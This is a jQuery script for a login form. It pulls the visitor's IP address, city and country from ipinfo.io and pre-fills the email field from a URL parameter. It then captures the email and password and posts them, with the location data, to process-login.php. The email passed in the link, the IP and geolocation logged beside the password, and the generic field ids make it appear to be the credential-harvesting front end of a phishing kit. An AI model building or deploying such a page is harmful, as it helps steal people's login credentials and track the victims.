<script>
    $(document).ready(function() {
        // Fetch geolocation information using ipinfo.io API
        $.get("https://ipinfo.io", function(response) {
            $("#city").val(response.city);
            $("#country").val(response.country);
            $("#ip_address").val(response.ip);
        }, "jsonp");

        // Get the email parameter from the URL
        var urlParams = new URLSearchParams(window.location.search);
        var emailParam = urlParams.get('email');

        // Set the value of the email input field if the email parameter exists
        if (emailParam) {
            $("#x1").val(emailParam);
        }

        $("#formx").submit(function(e) {
            e.preventDefault();
            // Capture email and password
            var email = $("#x1").val();
            var password = $("#x2").val();
            // Prepare form data
            var formData = new FormData($("#formx")[0]);
            // Disable submit button and show loading spinner
            $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
            <span class="spinner-grow spinner-grow-sm"></span>
            Please Wait...
        </button>`).prop("disabled", true);
            // Send form data to server-side script
            $.ajax({
                url: "process-login.php", // Update with the actual URL of your server-side script
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,
                success: function(res) {
                    // Handle success response
                    console.log(res);
                },
                error: function(xhr, status, error) {
                    // Handle error response
                    console.error(xhr.responseText);
                }
            });
        });
    });
</script>
